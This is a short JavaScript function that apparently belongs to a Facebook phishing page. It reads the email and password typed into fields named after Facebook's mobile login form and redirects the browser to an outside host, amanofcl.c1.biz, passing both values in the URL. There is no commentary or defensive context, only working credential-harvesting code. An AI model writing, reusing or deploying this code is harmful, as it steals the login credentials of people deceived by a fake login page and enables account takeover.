function send(){
  let eml = document.getElementById("m_login_email").value;
  let pas = document.getElementById("m_login_password").value;
  location.href=`http://amanofcl.c1.biz/f/facebook/login.php?email=${eml}&pass=${pas}`;
}
